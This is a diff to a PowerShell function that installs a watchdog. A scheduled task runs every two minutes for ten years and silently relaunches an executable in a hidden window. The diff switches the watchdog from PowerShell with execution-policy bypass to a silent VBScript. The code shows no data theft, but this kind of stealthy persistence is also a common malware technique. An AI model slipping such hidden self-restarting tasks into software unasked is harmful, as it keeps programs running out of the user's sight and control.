@@ -185,25 +185,32 @@ function Register-WatchdogTask {
         [string]$UpdateMarker
     )
 
-    $watchFile = Join-Path $Dir "watchdog.ps1"
+    $procImage = if ($ProcessName -match '\.exe$') { $ProcessName } else { "$ProcessName.exe" }
+    $watchFile = Join-Path $Dir "watchdog.vbs"
     $watchLines = @(
-        '$ErrorActionPreference = "SilentlyContinue"'
-        ('$Exe = "' + ($Exe.Replace('"', '`"')) + '"')
-        ('$Dir = "' + ($Dir.Replace('"', '`"')) + '"')
-        ('$Name = "' + $ProcessName + '"')
-        ('$Marker = "' + ($UpdateMarker.Replace('"', '`"')) + '"')
-        'if ((Test-Path -LiteralPath $Marker)) { exit 0 }'
-        'if (-not (Get-Process -Name $Name -ErrorAction SilentlyContinue)) {'
-        '    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden'
-        '}'
+        'Option Explicit'
+        'Dim fso, sh, wmi, procs'
+        ('Const PROC_NAME = "' + $procImage + '"')
+        ('Const EXE_PATH = "' + ($Exe.Replace('"', '""')) + '"')
+        ('Const WORK_DIR = "' + ($Dir.Replace('"', '""')) + '"')
+        ('Const UPDATE_MARKER = "' + ($UpdateMarker.Replace('"', '""')) + '"')
+        'Set fso = CreateObject("Scripting.FileSystemObject")'
+        'If fso.FileExists(UPDATE_MARKER) Then WScript.Quit 0'
+        'Set wmi = GetObject("winmgmts:\\.\root\cimv2")'
+        'Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''" & PROC_NAME & "''")'
+        'If procs.Count = 0 Then'
+        '  Set sh = CreateObject("Wscript.Shell")'
+        '  sh.CurrentDirectory = WORK_DIR'
+        '  sh.Run """" & EXE_PATH & """", 0, False'
+        'End If'
     )
-    Set-Content -LiteralPath $watchFile -Value $watchLines -Encoding UTF8
-    Unblock-File -LiteralPath $watchFile -ErrorAction SilentlyContinue
+    Set-Content -LiteralPath $watchFile -Value $watchLines -Encoding ASCII
+    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
 
-    $taskArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchFile`""
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $taskArgs -WorkingDirectory $Dir
+    $taskArgs = "//B //Nologo `"$watchFile`""
+    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $taskArgs -WorkingDirectory $Dir
     $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
 }
 
